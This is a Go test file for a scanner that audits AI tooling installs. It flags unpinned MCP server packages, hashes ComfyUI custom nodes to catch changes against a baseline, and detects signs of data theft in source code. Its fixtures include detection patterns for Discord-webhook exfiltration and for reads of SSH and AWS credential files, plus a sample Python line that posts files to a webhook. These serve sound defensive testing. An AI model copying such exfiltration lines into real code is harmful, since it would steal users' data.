package supply

import (
	"crypto/md5"
	"crypto/sha256"
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/MC-kakadu/AIexpose/internal/model"
)

func TestUnpinnedPackage(t *testing.T) {
	cases := []struct {
		name     string
		command  string
		args     []string
		wantPkg  string
		wantFlag bool
	}{
		{"npx bare name", "npx", []string{"-y", "postmark-mcp"}, "postmark-mcp", true},
		{"npx explicit latest", "npx", []string{"weather-mcp@latest"}, "weather-mcp@latest", true},
		{"npx pinned", "npx", []string{"-y", "postmark-mcp@1.4.2"}, "", false},
		{"npx scoped pinned", "npx", []string{"-y", "@modelcontextprotocol/server-filesystem@2026.8.1", "/tmp"}, "", false},
		{"npx scoped unpinned", "npx", []string{"-y", "@modelcontextprotocol/server-filesystem"}, "@modelcontextprotocol/server-filesystem", true},
		{"uvx pinned", "uvx", []string{"weather-mcp==1.0.0"}, "", false},
		{"uvx unpinned", "uvx", []string{"weather-mcp"}, "weather-mcp", true},
		{"windows npx.cmd", "C:\\Program Files\\nodejs\\npx.cmd", []string{"-y", "some-mcp"}, "some-mcp", true},
		{"not a runner", "node", []string{"server.js"}, "", false},
		{"local binary", "/usr/local/bin/my-server", nil, "", false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			pkg, ok := unpinnedPackage(c.command, c.args)
			if ok != c.wantFlag || pkg != c.wantPkg {
				t.Errorf("unpinnedPackage(%q, %v) = %q,%v; want %q,%v",
					c.command, c.args, pkg, ok, c.wantPkg, c.wantFlag)
			}
		})
	}
}

func TestPackageSpec(t *testing.T) {
	cases := []struct{ command, arg, name, version string }{
		{"npx", "postmark-mcp", "postmark-mcp", ""},
		{"npx", "postmark-mcp@1.4.2", "postmark-mcp", "1.4.2"},
		{"npx", "@modelcontextprotocol/server-filesystem@2026.8.1", "@modelcontextprotocol/server-filesystem", "2026.8.1"},
		{"npx", "@modelcontextprotocol/server-filesystem", "@modelcontextprotocol/server-filesystem", ""},
		{"uvx", "weather-mcp==1.0.0", "weather-mcp", "1.0.0"},
	}
	for _, c := range cases {
		name, ver, ok := packageSpec(c.command, []string{"-y", c.arg})
		if !ok || name != c.name || ver != c.version {
			t.Errorf("packageSpec(%q) = %q,%q,%v; want %q,%q,true",
				c.arg, name, ver, ok, c.name, c.version)
		}
	}
	if _, _, ok := packageSpec("node", []string{"server.js"}); ok {
		t.Error("a local command should not be reported as a registry package")
	}
}

// testRules mirrors a few entries from the signed feed. Patterns are no longer
// compiled into this package, so a test must install them the way the feed does.
func testRules(t *testing.T) {
	t.Helper()
	skipped := SetIndicatorRules([]RuleSpec{
		{ID: "EXFIL-DISCORD", Title: "Posts data to a Discord webhook", Severity: model.Critical,
			Pattern: `https?://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/`},
		{ID: "STEAL-SSH", Title: "Reads SSH or cloud credential files", Severity: model.High,
			Pattern: `(?:\.ssh[\\/]id_(?:rsa|ed25519)|\.aws[\\/]credentials)`},
	})
	if len(skipped) != 0 {
		t.Fatalf("test patterns did not compile: %v", skipped)
	}
	t.Cleanup(func() { SetIndicatorRules(nil) })
}

// A malformed pattern must be skipped and named, never abort the whole scan.
func TestSetIndicatorRulesSkipsBadPatterns(t *testing.T) {
	skipped := SetIndicatorRules([]RuleSpec{
		{ID: "GOOD", Title: "fine", Severity: model.High, Pattern: `abc`},
		{ID: "BROKEN", Title: "bad", Severity: model.High, Pattern: `a(`},
	})
	if len(skipped) != 1 {
		t.Fatalf("skipped = %v, want one entry naming BROKEN", skipped)
	}
	if IndicatorRuleCount() != 1 {
		t.Errorf("rule count = %d, want the one good rule still active", IndicatorRuleCount())
	}
	SetIndicatorRules(nil)
}

// With no patterns installed the scanner reports nothing rather than panicking.
func TestNoRulesMeansNoIndicators(t *testing.T) {
	SetIndicatorRules(nil)
	dir := t.TempDir()
	path := filepath.Join(dir, "node.py")
	if err := os.WriteFile(path, []byte(`requests.post("https://discord.com/api/webhooks/1/abc")`), 0o600); err != nil {
		t.Fatal(err)
	}
	if got := scanSource(path); len(got) != 0 {
		t.Fatalf("got %+v with no rules loaded, want none", got)
	}
}

func TestScanSourceDetectsExfil(t *testing.T) {
	testRules(t)
	dir := t.TempDir()
	path := filepath.Join(dir, "node.py")
	src := "import requests\n" +
		"requests.post(\"https://discord.com/api/webhooks/1/abc\", files={\"f\": blob})\n"
	if err := os.WriteFile(path, []byte(src), 0o600); err != nil {
		t.Fatal(err)
	}
	got := scanSource(path)
	if len(got) != 1 || got[0].ID != "EXFIL-DISCORD" {
		t.Fatalf("got %+v, want one EXFIL-DISCORD indicator", got)
	}
	if got[0].Line != 2 {
		t.Errorf("line = %d, want 2", got[0].Line)
	}
}

// A scanner that fires on ordinary node code trains people to ignore it.
func TestScanSourceNoFalsePositiveOnOrdinaryNode(t *testing.T) {
	testRules(t)
	dir := t.TempDir()
	path := filepath.Join(dir, "node.py")
	src := `import os, subprocess, requests
import torch

NODE_CLASS_MAPPINGS = {"Upscale": UpscaleNode}

class UpscaleNode:
    def run(self, image):
        subprocess.run(["ffmpeg", "-i", "in.png", "out.png"], check=True)
        r = requests.get("https://huggingface.co/api/models")
        return torch.nn.functional.interpolate(image, scale_factor=2)
`
	if err := os.WriteFile(path, []byte(src), 0o600); err != nil {
		t.Fatal(err)
	}
	if got := scanSource(path); len(got) != 0 {
		t.Fatalf("false positives on ordinary node code: %+v", got)
	}
}

func TestHashTreeChangesWithContentAndFilename(t *testing.T) {
	dir := t.TempDir()
	write := func(name, body string) {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	write("a.py", "print(1)")
	b := func() *walkBudget { return newBudget(5*time.Second, 1000) }

	tree := hashTree(dir, b(), Options{})
	first := tree.digest
	if tree.count != 1 {
		t.Fatalf("file count = %d, want 1", tree.count)
	}
	if len(tree.fileDigests) != 1 {
		t.Fatalf("per-file digests = %d, want 1", len(tree.fileDigests))
	}
	if len(tree.md5s) != 0 {
		t.Fatalf("MD5s were collected with Options{} = %d, want none", len(tree.md5s))
	}
	if again := hashTree(dir, b(), Options{}); again.digest != first {
		t.Error("digest is not stable across runs")
	}

	write("a.py", "print(2)")
	if changed := hashTree(dir, b(), Options{}); changed.digest == first {
		t.Error("digest did not change when file contents changed")
	}

	// A weights file must not move the digest; only code and config do.
	write("a.py", "print(1)")
	if err := os.WriteFile(filepath.Join(dir, "model.safetensors"), []byte("xxxx"), 0o600); err != nil {
		t.Fatal(err)
	}
	if withWeights := hashTree(dir, b(), Options{}); withWeights.digest != first {
		t.Error("digest changed when a non-code file was added")
	}

	// Turning MD5 collection on must not disturb the digest, or every baseline
	// recorded before this option existed would report as modified.
	withMD5 := hashTree(dir, b(), Options{MD5: true})
	if withMD5.digest != first {
		t.Errorf("digest changed when MD5 collection was enabled:\n got %s\nwant %s", withMD5.digest, first)
	}
	if len(withMD5.md5s) != 1 {
		t.Fatalf("MD5s = %d, want 1 (a.py; the .safetensors file is neither code nor a binary type)", len(withMD5.md5s))
	}
	if got, want := withMD5.md5s[0].Sum, md5.Sum([]byte("print(1)")); got != want {
		t.Errorf("MD5 of a.py = %x, want %x", got, want)
	}
}

// A digest is capped at 8 MB but an MD5 is not: a corpus records whole-file
// hashes, so a partial one would match nothing.
func TestMD5CoversWholeFileWhileDigestStaysCapped(t *testing.T) {
	dir := t.TempDir()
	body := make([]byte, digestLimit+4096)
	for i := range body {
		body[i] = byte(i)
	}
	path := filepath.Join(dir, "big.py")
	if err := os.WriteFile(path, body, 0o600); err != nil {
		t.Fatal(err)
	}
	sha, sum, ok, err := fileHashes(path, true, true)
	if err != nil || !ok {
		t.Fatalf("fileHashes: %v ok=%v", err, ok)
	}
	if want := sha256.Sum256(body[:digestLimit]); sha != hex.EncodeToString(want[:]) {
		t.Error("digest covered more than the first 8 MB")
	}
	if want := md5.Sum(body); sum != want {
		t.Error("MD5 did not cover the whole file")
	}
}

// Compiled and archived files are what a malware corpus is made of, but they
// must stay out of the digest so that a downloaded binary does not read as a
// code change.
func TestBinaryFilesAreHashedButNotInTheDigest(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "a.py"), []byte("print(1)"), 0o600); err != nil {
		t.Fatal(err)
	}
	b := func() *walkBudget { return newBudget(5*time.Second, 1000) }
	before := hashTree(dir, b(), Options{MD5: true})

	if err := os.WriteFile(filepath.Join(dir, "helper.dll"), []byte("MZ payload"), 0o600); err != nil {
		t.Fatal(err)
	}
	after := hashTree(dir, b(), Options{MD5: true})

	if after.digest != before.digest {
		t.Error("adding a .dll changed the artifact digest")
	}
	if after.count != before.count {
		t.Errorf("file count changed from %d to %d", before.count, after.count)
	}
	if len(after.md5s) != len(before.md5s)+1 {
		t.Fatalf("MD5s = %d, want %d", len(after.md5s), len(before.md5s)+1)
	}
	var found bool
	for _, h := range after.md5s {
		if h.Rel == "helper.dll" {
			found = true
			if want := md5.Sum([]byte("MZ payload")); h.Sum != want {
				t.Errorf("dll MD5 = %x, want %x", h.Sum, want)
			}
		}
	}
	if !found {
		t.Error("the .dll was not hashed")
	}
}

// Nothing this scan reads is worth stalling on, so a file past the size limit
// is skipped rather than hashed.
func TestOversizeFilesAreSkipped(t *testing.T) {
	dir := t.TempDir()
	budget := newBudget(5*time.Second, 1000)
	budget.maxBytes = 64 // smaller than the file below

	if err := os.WriteFile(filepath.Join(dir, "big.dll"), make([]byte, 4096), 0o600); err != nil {
		t.Fatal(err)
	}
	tree := hashTree(dir, budget, Options{MD5: true})
	if len(tree.md5s) != 0 {
		t.Errorf("MD5s = %d, want 0: the read budget was already spent", len(tree.md5s))
	}
}

func TestDiffClassifiesChanges(t *testing.T) {
	base := Inventory{Artifacts: []Artifact{
		{Kind: "comfy-node", ID: "comfy-node:keep", Name: "keep", Digest: "aaa"},
		{Kind: "comfy-node", ID: "comfy-node:gone", Name: "gone", Digest: "bbb"},
		{Kind: "comfy-node", ID: "comfy-node:manager", Name: "manager", Digest: "ccc"},
	}}
	cur := Inventory{Artifacts: []Artifact{
		{Kind: "comfy-node", ID: "comfy-node:keep", Name: "keep", Digest: "aaa"},
		{Kind: "comfy-node", ID: "comfy-node:manager", Name: "manager", Digest: "ddd",
			Indicators: []Indicator{{ID: "EXFIL-TELEGRAM"}}},
		{Kind: "comfy-node", ID: "comfy-node:new", Name: "new", Digest: "eee"},
	}}

	changes := Diff(base, cur)
	if len(changes) != 3 {
		t.Fatalf("got %d changes, want 3: %+v", len(changes), changes)
	}
	// The rug-pull must sort first.
	if changes[0].Type != Modified || !changes[0].HasNewIndicator() {
		t.Errorf("first change should be the modified artifact with a new indicator, got %+v", changes[0])
	}
	seen := map[ChangeType]bool{}
	for _, c := range changes {
		seen[c.Type] = true
	}
	for _, want := range []ChangeType{Added, Removed, Modified} {
		if !seen[want] {
			t.Errorf("missing a %q change", want)
		}
	}
}

func TestDiffQuietWhenNothingChanged(t *testing.T) {
	inv := Inventory{Artifacts: []Artifact{{ID: "a", Digest: "x"}, {ID: "b", Digest: "y"}}}
	if got := Diff(inv, inv); len(got) != 0 {
		t.Fatalf("identical inventories produced %d changes: %+v", len(got), got)
	}
}

func TestBaselineRoundTrip(t *testing.T) {
	path := filepath.Join(t.TempDir(), "nested", "baseline.json")
	if _, err := LoadBaseline(path); err != ErrNoBaseline {
		t.Fatalf("LoadBaseline on a missing file = %v, want ErrNoBaseline", err)
	}
	in := Inventory{Taken: time.Now().UTC().Truncate(time.Second), OS: "linux",
		Artifacts: []Artifact{{Kind: "mcp-server", ID: "mcp-server:x", Name: "x", Digest: "d"}}}
	if err := SaveBaseline(path, in); err != nil {
		t.Fatal(err)
	}
	out, err := LoadBaseline(path)
	if err != nil {
		t.Fatal(err)
	}
	if len(out.Artifacts) != 1 || out.Artifacts[0].ID != "mcp-server:x" {
		t.Errorf("round trip lost data: %+v", out)
	}
	st, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if perm := st.Mode().Perm(); perm != 0o600 && perm != 0o666 {
		t.Errorf("baseline permissions = %o, want 0600", perm)
	}
}

// The inventory records which environment variables an MCP server receives,
// never their values, because those values are credentials.
func TestMCPArtifactsNeverRecordSecretValues(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "mcp.json")
	cfg := `{"mcpServers":{"pm":{"command":"npx","args":["-y","postmark-mcp"],
	         "env":{"POSTMARK_SERVER_TOKEN":"super-secret-value"}}}}`
	if err := os.WriteFile(path, []byte(cfg), 0o600); err != nil {
		t.Fatal(err)
	}
	arts := mcpArtifacts(path)
	if len(arts) != 1 {
		t.Fatalf("got %d artifacts, want 1", len(arts))
	}
	for k, v := range arts[0].Detail {
		if v == "super-secret-value" {
			t.Fatalf("detail %q leaked the credential value", k)
		}
	}
	if arts[0].Detail["env_keys"] != "POSTMARK_SERVER_TOKEN" {
		t.Errorf("env_keys = %q, want the variable name", arts[0].Detail["env_keys"])
	}
	if arts[0].Detail["unpinned"] != "postmark-mcp" {
		t.Errorf("unpinned = %q, want postmark-mcp", arts[0].Detail["unpinned"])
	}
}

// The ComfyUI Desktop app keeps nothing under the home directory: each install
// lives in %LOCALAPPDATA%\Comfy-Desktop\ComfyUI-Installs\<name>\ComfyUI. A real
// machine with ComfyUI installed reported zero nodes because of this.
func TestComfyDesktopInstallsAreFound(t *testing.T) {
	home := t.TempDir()
	local := t.TempDir()
	t.Setenv("LOCALAPPDATA", local)
	t.Setenv("COMFYUI_PATH", "")

	// Two installs, named by the user, as the desktop app lays them out.
	for _, name := range []string{"a3sc", "second-install"} {
		d := filepath.Join(local, "Comfy-Desktop", "ComfyUI-Installs", name, "ComfyUI", "custom_nodes")
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	// The legacy home-directory layout of older desktop versions.
	legacy := filepath.Join(home, "ComfyUI-Installs", "old", "ComfyUI", "custom_nodes")
	if err := os.MkdirAll(legacy, 0o755); err != nil {
		t.Fatal(err)
	}

	got := comfyNodeRoots(home)
	if len(got) != 3 {
		t.Fatalf("found %d custom_nodes directories, want 3:\n  %s", len(got), strings.Join(got, "\n  "))
	}
	for _, want := range []string{"a3sc", "second-install", "old"} {
		var ok bool
		for _, g := range got {
			if strings.Contains(g, want) {
				ok = true
			}
		}
		if !ok {
			t.Errorf("install %q was not found in %v", want, got)
		}
	}
}

// Install names are chosen by the user, so they must be read from disk rather
// than guessed from a fixed list.
func TestUnknownInstallNamesAreStillFound(t *testing.T) {
	home := t.TempDir()
	local := t.TempDir()
	t.Setenv("LOCALAPPDATA", local)
	t.Setenv("COMFYUI_PATH", "")

	d := filepath.Join(local, "Comfy-Desktop", "ComfyUI-Installs", "실험용 설치", "ComfyUI", "custom_nodes")
	if err := os.MkdirAll(d, 0o755); err != nil {
		t.Fatal(err)
	}
	got := comfyNodeRoots(home)
	if len(got) != 1 {
		t.Fatalf("an install with an arbitrary name was not found: %v", got)
	}
}

// An install directory with no ComfyUI tree inside it must not be reported.
func TestEmptyInstallDirectoryIsNotAReport(t *testing.T) {
	home := t.TempDir()
	local := t.TempDir()
	t.Setenv("LOCALAPPDATA", local)
	t.Setenv("COMFYUI_PATH", "")

	if err := os.MkdirAll(filepath.Join(local, "Comfy-Desktop", "ComfyUI-Installs", "half-removed"), 0o755); err != nil {
		t.Fatal(err)
	}
	if got := comfyNodeRoots(home); len(got) != 0 {
		t.Errorf("an install with no ComfyUI tree was reported: %v", got)
	}
}

// __pycache__ sitting beside the real nodes was inventoried as a component of
// its own, with a digest that was the SHA-256 of nothing. A user's report
// listed it as a ComfyUI custom node awaiting review.
func TestToolDirectoriesAreNotComponents(t *testing.T) {
	root := t.TempDir()
	real := filepath.Join(root, "ComfyUI-GGUF")
	if err := os.MkdirAll(real, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(real, "__init__.py"), []byte("import torch\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, junk := range []string{"__pycache__", "node_modules", ".venv"} {
		d := filepath.Join(root, junk)
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
		// Give them content of the kind those directories really hold.
		if err := os.WriteFile(filepath.Join(d, "thing.pyc"), []byte("\x00\x00compiled"), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	got := dirArtifacts("comfy-node", root, newBudget(5*time.Second, 1000), Options{})
	if len(got) != 1 {
		var names []string
		for _, a := range got {
			names = append(names, a.Name)
		}
		t.Fatalf("inventoried %v, want only the real node", names)
	}
	if got[0].Name != "ComfyUI-GGUF" {
		t.Errorf("kept %q", got[0].Name)
	}
}

// A directory with nothing this scan can read is not a component either: it
// cannot drift, and asking someone to review it wastes the one thing a review
// list has, which is the reader's attention.
func TestEmptyDirectoriesAreNotComponents(t *testing.T) {
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, "empty-node"), 0o755); err != nil {
		t.Fatal(err)
	}
	if got := dirArtifacts("comfy-node", root, newBudget(5*time.Second, 1000), Options{}); len(got) != 0 {
		t.Errorf("an empty directory was inventoried: %+v", got)
	}
}
